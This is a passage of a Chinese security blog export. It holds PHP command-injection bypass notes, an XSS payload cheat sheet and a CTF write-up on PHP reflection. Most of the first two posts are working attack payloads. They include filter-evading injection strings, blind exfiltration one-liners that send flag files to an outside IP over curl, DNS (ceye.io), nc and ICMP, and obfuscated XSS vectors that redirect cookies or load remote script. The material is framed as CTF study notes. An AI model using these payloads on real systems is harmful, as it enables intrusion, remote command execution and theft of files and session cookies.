表示标准错误（stderr）。 12345678910111213141516171819202122&lt;?php$descriptorspec = array( 0 =&gt; array(&apos;pipe&apos;, &apos;r&apos;), 1 =&gt; array(&apos;pipe&apos;, &apos;w&apos;), 2 =&gt; array(&apos;file&apos;, &apos;/dev/shm/error-output.txt&apos;, &apos;a&apos;)); $process = proc_open(&apos;ls -la&apos;, $descriptorspec, $pipes); if (is_resource($process)) &#123; $output = stream_get_contents($pipes[1]); fclose($pipes[0]); fclose($pipes[1]); // 调用proc_close前必须把所有管道先关闭，避免出现死锁 $retval = proc_close($process); echo &quot;&lt;pre&gt;$output&lt;/pre&gt;&quot;; echo &apos;&lt;br&gt;Return value: &apos; . $retval;&#125; escapeshellcmd()/escapeshellarg()（属于命令执行绕过范畴）8.1、escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数 转义字符串$arg中的单引号并使用单引号包裹此部分 使得$arg只能传递一个参数，且不能执行不同的命令 escapeshellarg ( string $arg ) : string 8.2、escapeshellcmd — shell 元字符转义 escapeshellcmd ( string $command ) : string 转义&amp; # ; | * ? ~ &lt; &gt; ^ ( ) [ ] { } $ 、x0A和xF，&#39;和&quot; 仅在落单时被转义 这些都会用^来取消其意义。也就是没办法用&amp; | 来执行其他命令，只能列目录。 以上两个函数都是为了保证命令在经过system以及其他命令执行函数时防止用户输入非法的命令，但是这两个函数并非是万能的，依旧有许多方式进行绕过。1.escapeshellcmd与escapeshellarg同时存在时候可以利用其差异性进行绕过 集合1passthru,exec,system,chroot,chgrp,chown,shell_exec,popen,proc_open,ini_alter,ini_restore,dl,openlog,syslog,readlink,symlink,pope,passthru windows下文件读取1.more flag.txt 2.type flag.txt linux下文件读取1.cat flag.txt /{cat,flag.txt} 2.more flag.txt 3.less flag.txt 4.head flag.txt 5.tail flag.txt 6.tac flag.txt 7.nl flag.txt 8.od flag.txt 9.fire flag.txt 10.wc flag.txt 11.uniq flag.txt 12.diff flag.txt flag1.txt 13.sed -n &#39;1,2p&#39; flag.txt 14.find -P flag.txt 15、strings flag.txt 16、tailf flag.txt 17、curl file:///root/flag.txt 18、sort flag.txt 19、{grep,-nrw,.} 20、grep -r .. 21、bash -v flag.txt 22、rev flag.txt windows 写文件linux 写文件1.tee flag.txt 三、命令执行绕过命令分隔符123456%0a、%0d 换行符与回车符| 第一条命令结果作为第二条命令的输入|| 第一条执行失败，执行第二条命令（; 连续指令功能。&amp; 连接的两条命令都会执行&amp;&amp; 当第一条执行成功后执行后续命令 ${}值得注意的是在被“”包裹时候直接${}是不可以的，因为PHP将会将它识别为可变变量而不是一个PHP代码。这里有的有趣的发现，在下面已经将phpinfo()声明为可变变量后直接传入cmd=phpinfo()是可以执行的。 123456789if(isset($_GET[&quot;cmd&quot;]))&#123; $cmd = @(string)$_GET[&quot;cmd&quot;]; eval(&apos;$cmd=&quot;&apos; . addslashes($cmd) . &apos;&quot;;&apos;); echo &apos;$cmd=&quot;&apos; . addslashes($cmd) . &apos;&quot;;&apos;;&#125;else&#123; echo &apos;hello&apos;;&#125;$a=$&#123;phpinfo()&#125;; 当然对于${}来说会识别里面包含的第一个字符，只要将第一个字符修改为如空格，tab，注释，回车就会避免被直接当成变量，而会将其执行为PHP代码。 附上其他师傅总结payload php &gt;= 4.3 12345678910111213&quot;$&#123; phpinfo()&#125;&quot;;&quot;$&#123; phpinfo()&#125;&quot;;&quot;$&#123;/**/phpinfo()&#125;&quot;;&quot;$&#123;phpinfo()&#125;&quot;;&quot;$&#123;@phpinfo()&#125;&quot;;&quot;$&#123;( string )phpinfo()&#125;&quot;;&quot;$&#123;phpinfo[phpinfo()]&#125;&quot;;&quot;&#123;$phpinfo[phpinfo()]&#125;&quot;;&quot;&#123;$&#123;phpinfo()&#125;&#125;&quot;;&quot;$&#123;$&#123;phpinfo()&#125;&#125;&quot;; php&gt;=5.5 1&quot;$&#123;phpinfo()&#125;&quot;; 空格绕过测试代码，该目录下还有一个flag.txt 12345678&lt;?php if(isset($_GET[&apos;museljh&apos;]))&#123; $muse=$_GET[&apos;museljh&apos;]; system($muse);&#125;else&#123; echo &apos;no!no!no!&apos;;&#125; 原来的命令curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=cat flag.txt&quot;绕过空格 1.curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=cat%09flag.txt&quot; 2.curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh={ls,-l}&quot; 3.curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=cat&lt;&gt;flag.txt&quot; 4.curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=cat&lt;flag.txt&quot; 5.curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=cat${IFS}flag.txt&quot;（这个记得要url编码下 6.curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=cat$IFS$9flag.txt&quot;（url编码下,$9是linux系统shell进程的第九个参数，始终为空字符串 7.curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=cat$IFS\flag.txt&quot;备注：按道理来说curl -G --data-urlencode &quot;museljh=cat flag.txt&quot; http://120.77.176.168/test.php这样是可以直接urlencode编码的，但是却不行。 /绕过首先我们先知道一些小知识 echo ${PATH}在我环境中输出为 /opt/Java/bin:/opt/Java/jre/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:$JAVA_HOME/bin:/home/taoyx/program_develop/go_demo:/usr/local/go/bin${PATH:0:1}代表以上字符的第一个也就是/,这样我们就可以得到了，当然我感觉这样的方法应该还有很多，指不止PATH， 当然这也可以使用正则匹配，比如${PATH%%o*} %%o.* 表示从右向左匹配 o.* 并删除,这样就不用：。 同样的知识点${PATH##*.}表示非贪婪匹配，当然这个还有许多玩法就不一一说了。 echo ${LESSOPEN}| /usr/bin/lesspipe %s 加号/大于号绕过PS1——默认提示符 PS2——再谈提示符 PS3——Shell脚本中使用select时的提示符 PS4——PS4-“set -x”用来修改跟踪输出的前缀 $PS4 为 +号 $PS2 为大于号 黑名单绕过1.通配符利用1.curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=/???/?at flag.txt&quot; 突然想到一个小结合 curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=${PATH:0:1}???${PATH:0:1}?at%09flag.txt&quot;2.curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=cat flag*&quot; 夹杂字符1.curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=ca&#39;&#39;t flag.txt&quot; 2.curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=ca$1t flag.txt&quot;(这里的1可以改成任何一位数字) 3.curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=ca\t flag.txt&quot; 4.curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=ca${x}t flag.txt&quot; 5.curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=ca``t flag.txt&quot; 6.curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=ca&quot;&quot;t flag.txt&quot; 编码绕过1.curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=echo \&quot;63617420666c61672e747874\&quot;|xxd -r -p|bash&quot; (十六进制我本地莫名不行) 2.curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=echo \&quot;Y2F0IGZsYWcudHh0\&quot;|base64 -d|bash&quot; 结合一波 curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=echo%09\&quot;Y2F0IGZsYWcudHh0\&quot;|base64%09-d|bash&quot; 字符串拼接1.curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=a=cat;b=flag.txt;$a $b;&quot; 若;被过滤还可以用%0a,%0d 代替 2.curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=a=cat%0ab=flag.txt%0a$a $b%0a&quot; 多条命令执行1.curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=curl 127.0.0.1|ls&quot; 2.curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=ls||curl 127.0.0.1&quot; 前面命令执行失败才会执行后面命令 3.curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=ls&amp;curl 127.0.0.1&quot; 命令同时执行 4.curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=ls&amp;&amp;curl 127.0.0.1&quot; 只有在 &amp;&amp; 左边的命令返回真（命令返回值 $? == 0），&amp;&amp; 右边的命令才会被执行。 5.curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=ls;curl 127.0.0.1&quot; 不管前面命令执行成功没有，后面的命令继续执行 ip中.绕过将ip地址转换为数字地址 巧借全局变量上次一个比赛中学到的。在如下条件 1234567891011&lt;?php if(isset($_GET[&apos;museljh&apos;]))&#123; $muse=$_GET[&apos;museljh&apos;]; echo $muse,PHP_EOL; #system($muse); # system($_GET[&apos;b&apos;]); eval($muse); &#125;else&#123; echo &apos;no!no!no!&apos;;&#125; 1.curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=$pi=base_convert(9911,10,28);base_convert(1751504350,10,36)($pi(99).$pi(97).$pi(116).$pi(32).$pi(42)); &quot; system(&#39;cat /*&#39;); curl -l -w &#39;\n&#39; --header &#39;9: ls&#39; &#39;http://120.77.176.168/test.php?museljh=system(getallheaders()\{9\});&#39; system(getallheaders(){9}) 3.GET/POST 四、无回显命令执行反弹shell万金油一般的存在，我之前已经写过一篇对此的小总结了。 curl -T museljh.txt http://120.77.176.168:11122补充下ftpcurl –T {path to file} ftp://xxx.xxx.xxx.xxx –user {username}:{museljh} 备注：对于curl来说 -F 以及–data来说都默认改为POST请求方式 curl &quot;http://120.77.176.168:11122&quot; --data-binary &quot;@museljh.txt&quot;ping `whoami`.**.ceye.ioceye.io是一个免费的DNS解析平台，会给每个注册用户一个免费的子域名同构构造类似ping `whoami`.**.ceye.io，命令可以将我们得到的结果传递给四级子域名，在ceye.io平台中就可以看到我们的DNS解析记录，嗯，有空再写篇博客研究下DNS隧道技术。这里不得不提下我看到的一个师傅文章中的一个操作，因为域名不能带空格，我们可以使用sed进行替换 格式：sed &#39;s/要替换的字符串/新的字符串/g&#39; 1ping `cat flag.txt|sed s/[[:space:]]/xx/g`.museljh.ceye.io 这里还有要注意的，因为不仅仅是空格DNS解析的时候还是有挺多符号是不能解析的比如&#39;,不过要替换的东西可以用正则表示。（按道理来说一般flag里应该也没有什么特殊字符） 不过就算有多个我们也是可以绕过了，我暂时只想到这样的方法,办法确实是笨了点。不知道有没有师傅有更好办法。 1ping `cat museljh.txt|sed s/[[:space:]]/museljh/g|sed s/\&apos;/museljh/g`.8itzz8.ceye.io curl http://8itzz8.ceye.io/`whoami`和第3点原理一样只是换成curl而已,除此之外在ceye.io平台中还提供了sql等payload可以说是很赞的了。 nc -l -p 11122 &lt; museljh.txt，curl http://120.x.176.x:11122使用nc将文件重定向到监听端，我们访问这个监听端即可 wget --header=&quot;museljh:cat flag.txt&quot; http://120.77.176.168:11122cat flag.txt | xxd -p -c 16 | while read exfil; do ping -p $exfil -c 1 127.0.0.1; done使用ICMP，可以看日志，可以用tcpdump抓包。收到启发，同样想到可以这样 cat flag.txt |sed s/[[:space:]]/xx/g|while read museljh; do curl http://120.77.176.168:11122/?id=$museljh; done 这样,这里是可以不用使用空格的，我这边sed是多余的。使用类似这样的方法就可以解决之前DNS解析无法使用空格等非法字符了。 cat flag.txt |sed s/[[:space:]]/xx/g| xxd -p -c 16 | while read museljh; do curl http://120.77.176.168:11122/?id=$museljh; done 以下是我没试过的，只是列出来 net use h: \\xxx.xxx.xxx.xxx\web /user:{username} {museljh} &amp;&amp; copy {File to Copy} h:\{filename}.txttelnet xxx.xxx.xxx.xxx {port} &lt; {file to transfer}总的来说还是反弹shell比较合算 五、畸变的webshell六、PHP文件读取函数集合1file_get_contents（）、highlight_file（）、fopen（）、readfile（）、fread（）、fgetss（）、fgets（）、parse_ini_file（）、show_source（）、file（） 七、PHP输出当前进程所有变量 / 常量 / 模块 / 函数 / 类get_defined_functions()get_defined_functions — 返回所有已定义函数的数组get_defined_functions ([ bool $exclude_disabled = FALSE ] ) : array 12345678910&lt;?phpfunction myrow($id, $data)&#123; return &quot;&lt;tr&gt;&lt;th&gt;$id&lt;/th&gt;&lt;td&gt;$data&lt;/td&gt;&lt;/tr&gt;\n&quot;;&#125;$arr = get_defined_functions();print_r($arr);?&gt; get_defined_vars()get_defined_vars — 返回由所有已定义变量所组成的数组 get_defined_vars ( void ) : array 此函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。 12345678910111213141516171819&lt;?php echo &apos;&lt;pre&gt;&apos;; $vars = get_defined_vars();$b = array(1,1,2,3,5,8); $arr = get_defined_vars(); // 打印 $b //print_r($arr[&quot;b&quot;]); // 打印所有服务器变量 //print_r($arr[&quot;_SERVER&quot;]); // 打印变量数组的所有可用键值 print_r(get_defined_vars()); print_r(array_keys(get_defined_vars())); $vars = array_diff(get_defined_vars(),$vars);print_r($vars);?&gt; get_loaded_extensions()get_loaded_extensions — 返回所有编译并加载模块名的 array get_loaded_extensions ([ bool $zend_extensions = false ] ) : array 123&lt;?phpprint_r(get_loaded_extensions());?&gt; get_extension_funcs()get_extension_funcs — 返回模块函数名称的数组 get_extension_funcs ( string $module_name ) : array 该函数根据 module_name 返回模块内定义的所有函数的名称。 123&lt;?phpprint_r(get_extension_funcs(&quot;curl&quot;));?&gt; get_defined_constants()get_defined_constants — 返回所有常量的关联数组，键是常量名，值是常量值 get_defined_constants ([ bool $categorize = false ] ) : array 返回当前所有已定义的常量名和值。 这包含 define() 函数所创建的，也包含了所有扩展所创建的。 123&lt;?phpprint_r(get_defined_constants());?&gt; get_declared_classes()get_declared_classes — 返回由已定义类的名字所组成的数组 get_declared_classes ( void ) : array 返回由当前脚本中已定义类的名字组成的数组。 123&lt;?phpprint_r(get_declared_classes());?&gt; 八、杂远程文件包含PHP文件包含会执行包含文件的代码，当开启了远程文件包含，则非常容易引起代码注入攻击。远程文件包含条件: allow_url_fopen=On, allow_url_include=On, 文件包含相关函数有: include, include_once, require, require_once 123&lt;?phpinclude($_GET[&apos;cmd&apos;]);?&gt; cmd=data:text/plain,%3C?php%20phpinfo%28%29;?%3E, 即执行phpinfo()。 反序列化验证绕过O:+4:&quot;test&quot;:1:{s:1:&quot;a&quot;;s:3:&quot;aaa&quot;;} 参考PHP代码注入和命令注入 php代码-命令执行漏洞 PHP执行系统外部命令函数:exec()、passthru()、system()、shell_exec() 命令执行与代码执行的小结 PHP命令执行&amp;代码执行 代码审计之代码执行 《代码审计》一点儿笔记 Deformity PHP Webshell、Webshell Hidden Learning Bypass_Disable_functions_Shell PHP函数篇之执行外部程序 PHP-escapeshell-命令执行 命令执行总结与tips 技术分析：攻击者是如何利用系统命令盲注实现“拖库”的？ 各种命令执行总结]]></content>
      <categories>
        <category>文章</category>
      </categories>
      <tags>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[xss小结]]></title>
    <url>%2F2019%2F04%2F24%2Fxss%E5%B0%8F%E7%BB%93%2F</url>
    <content type="text"><![CDATA[XSS语句反射XSS语句1. 1&lt;body/onfocus=alert(/xss/)&gt; 2. 1&lt;video src=1 onerror=alert(/xss/)&gt; 3. 1&lt;audio src=x onerror=alert(/xss/)&gt; 4. 1&lt;button onfocus=alert(/xss/) autofocus&gt; 5. 1&lt;details open ontoggle=top.alert(1)&gt; 6. 1&lt;details open ontoggle=top[&apos;prompt&apos;](1)&gt; 7. 1&lt;details open ontoggle=eval(‘alert(1)’) &gt; 8. 1&lt;iframe srcdoc=&quot;&lt;img src=x:x onerror=alert(1)&gt;&quot; /&gt; 9. 1&lt;details open ontoggle=eval(atob(&apos;YWxlcnQoMSk=&apos;)) &gt; 10. 1&lt;details open ontoggle=eval(&apos;\141\154\145\162\164\50\61\51&apos;) &gt; 11. 1&lt;details open ontoggle=eval(String.fromCharCode(97,108,101,114,116,40,49,41)) &gt; 12. 1&lt;details open ontoggle=eval(&quot;appendChild(createElement(&apos;script&apos;)).src=&apos;http://120.77.176.168:11122&apos;&quot;) &gt; 13. 1&lt;img src=x onerror=window.alert(1) &gt; 14. 1&lt;img src=x onerror=window[&apos;eva&apos;+&apos;l&apos;](alert(1)) &gt; 15. 1&lt;img src=x onerror=_=alert,_(/xss/) &gt; 16. 1&lt;img src=x onerror=_=&apos;e&apos;+&apos;val&apos;,_(alert(1)) &gt; 17. 1&lt;iframe onload=location=&apos;javascri&apos;.concat(&apos;pt:aler&apos;,&apos;t(1)&apos;)&gt; 18. 1&lt;iframe onload=location=[&apos;java&apos;,&apos;script:&apos;,&apos;alert(1)&apos;].join(&quot;&quot;)&gt; 19. 1&lt;body/onload=document.write(String.fromCharCode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,49,41,60,47,115,99,114,105,112,116,62)) &gt; 20. 1&lt;svg/onload=setTimeout(&apos;\141\154\145\162\164\50\61\51&apos;)&gt; XSS窃取cookie1. 1&lt;details open ontoggle=&quot;javascript:document.location=&apos;http://120.77.176.168:11122&apos;&quot;&gt; 2. 1&lt;video src=1 onerror=&quot;javascript:document.location=&apos;http://120.77.176.168:11122&apos;&quot;&gt; 3. 1&lt;iframe onload=location=&apos;javascri&apos;.concat(&quot;pt:document&quot;,&quot;.location=&quot;,&quot;&apos;http://120.77.176.168:11122&apos;&quot;)&gt; 4. 1&lt;iframe onload=s=createElement(&apos;script&apos;);body.appendChild(s);s.src=&apos;http://120.77.176.1&apos;.concat(&apos;68:111&apos;,&apos;22&apos;); &gt; 5. 1&lt;iframe onload=s=createElement(&apos;script&apos;);body.appendChild(s);s.src=&apos;http://120.77.176.1&apos;.\u0063oncat(&apos;68:111&apos;,&apos;22&apos;); &gt; 6. 1&lt;iframe onload=location=[&quot;java&quot;,&quot;script:&quot;,&quot;document.location=&quot;,&quot;&apos;http://120.77.176.168:11122&apos;&quot;].join(&quot;&quot;)&gt; 7. 1&lt;body/onload=document.write(String.fromCharCode(60,115,67,114,73,112,116,32,115,114,67,61,39,104,116,116,112,58,47,47,49,50,48,46,55,55,46,49,55,54,46,49,54,56,58,49,49,49,50,50,39,62,60,47,115,67,82,105,112,84,62)) &gt; 8. 1&lt;svg/onload=setTimeout(&quot;\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003a\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074\u002e\u006c\u006f\u0063\u0061\u0074\u0069\u006f\u006e\u003d\u0027\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0031\u0032\u0030\u002e\u0037\u0037\u002e\u0031\u0037\u0036\u002e\u0031\u0036\u0038\u003a\u0031\u0031\u0031\u0032\u0032\u0027&quot;)&gt; XSS窃取cookie 变形HTML编码绕过1. 1&lt;details open ontoggle=&quot;&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:&amp;#x64;&amp;#x6F;&amp;#x63;&amp;#x75;&amp;#x6D;&amp;#x65;&amp;#x6E;&amp;#x74;&amp;#x2E;&amp;#x6C;&amp;#x6F;&amp;#x63;&amp;#x61;&amp;#x74;&amp;#x69;&amp;#x6F;&amp;#x6E;&amp;#x3D;&apos;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x3A;&amp;#x2F;&amp;#x2F;&amp;#x31;&amp;#x32;&amp;#x30;&amp;#x2E;&amp;#x37;&amp;#x37;&amp;#x2E;&amp;#x31;&amp;#x37;&amp;#x36;&amp;#x2E;&amp;#x31;&amp;#x36;&amp;#x38;&amp;#x3A;&amp;#x31;&amp;#x31;&amp;#x31;&amp;#x32;&amp;#x32;&apos;&quot;&gt; unicode编码绕过1. 1&lt;details open ontoggle=eval(&apos;\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003a\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074\u002e\u006c\u006f\u0063\u0061\u0074\u0069\u006f\u006e\u003d\u0027\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0031\u0032\u0030\u002e\u0037\u0037\u002e\u0031\u0037\u0036\u002e\u0031\u0036\u0038\u003a\u0031\u0031\u0031\u0032\u0032\u0027&apos;) &gt; 2. 1&lt;svg/onload=\u0073etTimeout(&quot;\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003a\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074\u002e\u006c\u006f\u0063\u0061\u0074\u0069\u006f\u006e\u003d\u0027\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0031\u0032\u0030\u002e\u0037\u0037\u002e\u0031\u0037\u0036\u002e\u0031\u0036\u0038\u003a\u0031\u0031\u0031\u0032\u0032\u0027&quot;)&gt; Base64编码绕过1. 1&lt;details open ontoggle=eval(atob(&apos;amF2YXNjcmlwdDpkb2N1bWVudC5sb2NhdGlvbj0naHR0cDovLzEyMC43Ny4xNzYuMTY4OjExMTIyJw==&apos;)) &gt; 1&lt;video src=1 onerror=eval(atob(&apos;amF2YXNjcmlwdDpkb2N1bWVudC5sb2NhdGlvbj0naHR0cDovLzEyMC43Ny4xNzYuMTY4OjExMTIyJw==&apos;))&gt; js8编码绕过1&lt;details open ontoggle=eval(&apos;\152\141\166\141\163\143\162\151\160\164\72\144\157\143\165\155\145\156\164\56\154\157\143\141\164\151\157\156\75\47\150\164\164\160\72\57\57\61\62\60\56\67\67\56\61\67\66\56\61\66\70\72\61\61\61\62\62\47&apos;) &gt; 混合编码绕过1. 1&lt;details open ontoggle=\u0065val(atob(&apos;amF2YXNjcmlwdDpkb2N1bWVudC5sb2NhdGlvbj0naHR0cDovLzEyMC43Ny4xNzYuMTY4OjExMTIyJw==&apos;)) &gt; 2. 1&lt;img src=x onerror=window[&apos;eva&apos;+&apos;l&apos;](&apos;\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003a\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074\u002e\u006c\u006f\u0063\u0061\u0074\u0069\u006f\u006e\u003d\u0027\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0031\u0032\u0030\u002e\u0037\u0037\u002e\u0031\u0037\u0036\u002e\u0031\u0036\u0038\u003a\u0031\u0031\u0031\u0032\u0032\u0027&apos;) &gt; xss POST&amp;GET请求1. 1&lt;script&gt;fetch(&apos;exec.php&apos;,&#123;method:&apos;POST&apos;,headers:&#123;&apos;content-type&apos;:&apos;application/x-www-form-urlencoded&apos;&#125;,body:&apos;command=&apos;+encodeURIComponent(&apos;curl xss.zsxsoft.com:23457 -F&quot;a=@/flag.txt&quot;&apos;)+&apos;&amp;exec=1&apos;&#125;).then(p=&gt;p.text()).then(p=&gt;fetch(&apos;main.php&apos;,&#123;method:&apos;POST&apos;,headers:&#123;&apos;content-type&apos;:&apos;application/x-www-form-urlencoded&apos;&#125;,body:&apos;comment=&apos;+p&#125;))&lt;/script&gt; 2. 1&lt;iframe srcdoc=&quot;&lt;script&gt;fetch(&apos;exec.php&apos;,&#123;method:&apos;POST&apos;,headers:&#123;&apos;content-type&apos;:&apos;application/x-www-form-urlencoded&apos;&#125;,body:&apos;command=&apos;+encodeURIComponent(&apos;&apos;)&#125;).then(p=&gt;p.text()).then(p=&gt;fetch(&apos;main.php&apos;,&#123;method:&apos;POST&apos;,headers:&#123;&apos;content-type&apos;:&apos;application/x-www-form-urlencoded&apos;&#125;,body:&apos;comment=&apos;+p&#125;))&lt;/script&gt; &quot;&gt;&lt;/iframe&gt; 参考测试WAF来学习XSS姿势 XSS过滤绕过速查表]]></content>
      <categories>
        <category>文章</category>
      </categories>
      <tags>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ctf中的php反射]]></title>
    <url>%2F2019%2F04%2F24%2Fctf%E4%B8%AD%E7%9A%84php%E5%8F%8D%E5%B0%84%2F</url>
    <content type="text"><![CDATA[前言在2019CISCN中有这么一道题目需要我们通过PHP反射机制调用私有函数最终得到Flag，感觉十分神奇于是来探究下。 正文 反射通常被定义为程序在执行时检查自身并修改其逻辑的能力。在技术方面，反射是要求对象告诉你它的属性和方法，并改变那些成员（甚至是私有成员）。 在如上对于反射的定义我们不难发现通过反射我们能够修改一个程序逻辑包括属性、方法。并且不仅仅能够改变Public成员，甚至能够改变Private成员，可以说是一种十分实用的特性，我将结合2019CISCN题目来对对其进行分析。 1234567891011121314151617181920&lt;?phpif (!defined(&apos;LFI&apos;)) &#123; echo &quot;Include me!&quot;; exit();&#125;use interesting\FlagSDK;$sdk = new FlagSDK();$key = $_GET[&apos;key&apos;] ?? false;if (!$key) &#123; echo &quot;Please provide access key&lt;br \&gt;&quot;; echo &apos;$_GET[&quot;key&quot;];&apos;; exit();&#125;$flag = $sdk-&gt;verify($key);if ($flag) &#123; echo $flag;&#125; else &#123; echo &quot;Wrong Key&quot;; exit();&#125; 刚看到这题的时候我们队开始时是想通过var_dump($sdk-&gt;getHash());直接获取hash值的，但是由于这个方法是Private方法所以是不能直接var_dump出结果的，会报出如下错误&lt;b&gt;Fatal error&lt;/b&gt;: Call to private method FlagSDK::getHash() from context猜测题目应该是这样的： 12345678910111213141516171819class FlagSDK &#123;public function verify($key)&#123; if (sha1($key) === $this-&gt;getHash()) &#123; return &quot;too&#123;young-too-simple&#125;&quot;; &#125; return false;&#125;Private function getHash()&#123; return &apos;xxxxx&apos;;&#125;&#125; 在PHP手册中我们能够发现很多有趣的函数， 一、 反射读取私有成员 1234567891011121314&lt;?php //Enter your code here, enjoy! class FlagSDK &#123; private $hash=&apos;xxxx&apos;;&#125;$sdk = new FlagSDK();$reflect = new ReflectionClass($sdk);##var_dump($sdk-&gt;getHash());$props = $reflect-&gt;getProperties(ReflectionProperty::IS_PUBLIC | ReflectionProperty::IS_PRIVATE | ReflectionProperty::IS_PROTECTED);foreach ($props as $prop) &#123; $prop-&gt;setAccessible(true); print $prop-&gt;getName() . &quot;\t&quot;; print $prop-&gt;getValue($sdk).&quot;\n&quot;;&#125; 通过如上的构造，我们成功得到FlagSDK类的Private成员属性hash xxxx 二、 反射执行私有方法 123456789101112131415161718192021222324252627&lt;?php //Enter your code here, enjoy!class FlagSDK &#123;private $hash=&apos;xxxx&apos;;public function verify($key)&#123; if (sha1($key) === $this-&gt;getHash()) &#123; return &quot;too&#123;young-too-simple&#125;&quot;; &#125; return false;&#125;private function getHash()&#123; return &apos;xxxxx&apos;;&#125;&#125; $hash=new FlagSDK(); $objReflectClass = new ReflectionClass(&apos;FlagSDK&apos;); $method = $objReflectClass-&gt;getMethod(&apos;getHash&apos;); $method-&gt;setAccessible(true); $re=$method-&gt;invokeArgs($hash,array()); echo $re; 通过如上的构造，我们成功得到getHash的返回值 三、 反射重构变量 1.公有变量 1234567891011121314151617181920&lt;?php //Enter your code here, enjoy!class FlagSDK &#123;public $hash=&apos;xxxx&apos;;public function verify($key)&#123; if (sha1($key) === $this-&gt;getHash()) &#123; return &quot;Its&apos;s a flag&quot;; &#125; return false;&#125;private function getHash()&#123; return &apos;xxxxx&apos;;&#125;&#125;$FlagSDK = new FlagSDK;$reflectionClass = new ReflectionClass(&apos;FlagSDK&apos;);$reflectionClass-&gt;getProperty(&apos;hash&apos;)-&gt;setValue($FlagSDK,&apos;aaaa&apos;);var_dump($FlagSDK-&gt;hash); 可以看到$hash成功被我们修改为aaaa 2.私有变量 12345678910111213141516171819202122&lt;?php //Enter your code here, enjoy!class FlagSDK &#123;private $hash=&apos;xxxx&apos;;public function verify($key)&#123; if (sha1($key) === $this-&gt;getHash()) &#123; return &quot;Its&apos;s a flag&quot;; &#125; return false;&#125;private function getHash()&#123; return &apos;xxxxx&apos;;&#125;&#125;$FlagSDK = new FlagSDK;$reflectionClass = new ReflectionClass(&apos;FlagSDK&apos;);$reflectionProperty = $reflectionClass-&gt;getProperty(&apos;hash&apos;);$reflectionProperty-&gt;setAccessible(true);$reflectionProperty-&gt;setValue($FlagSDK, &apos;aaaa&apos;);var_dump($reflectionProperty-&gt;getValue($FlagSDK)); 可以看到$hash成功被我们修改为aaaa 四、 反射重构方法 依赖注入newInstanceWithoutConstructor 1.修改public方法返回值 2.修改private方法返回值 通过添加命名空间来控制函数、函数调用会先调用本命名空间中的同名函数（比如设置了一个interesting的命名空间假如调用sha1函数，就会先调用interesting/sha1而不是/sha1 123456789101112131415161718192021222324252627282930&lt;?phpnamespace interesting;function sha1($var) &#123; // 调用类的私有、保护方法 $class = new \ReflectionClass(&apos;interesting\FlagSDK&apos;); $method = $class-&gt;getMethod(&apos;getHash&apos;); $method-&gt;setAccessible(true); $instance = $class-&gt;newInstance(); return $method-&gt;invoke($instance);&#125;class FlagSDK &#123;protected $flagPath;public function verify($key)&#123; if (sha1($key) === $this-&gt;getHash()) &#123; return &quot;Its&apos;s a flag&quot;; &#125; return false;&#125;private function getHash()&#123; return &apos;xxxxx&apos;;&#125;&#125;$a =new FlagSDK();$b=$a-&gt;verify(&apos;1&apos;);echo $b;?&gt; 通过伪造sha1函数，成功返回flag 后来寻思着想不能能通过依赖注入的方式注入一个类到$flagPath变量中，这里有我只是提供个思路具体行不行我也不知道：1.修改$flagPath 也就是/var/www/html/flag.txt，改成我们能够控制的路径文件进行解密，不过我对于加密解密不是很了解就不往深处想了。2.依赖注入一个类使得这个类直接调用（好吧其实是多次一举，我上面已经说可以直接修改了$flagPath变量了，也不用整个依赖注入。 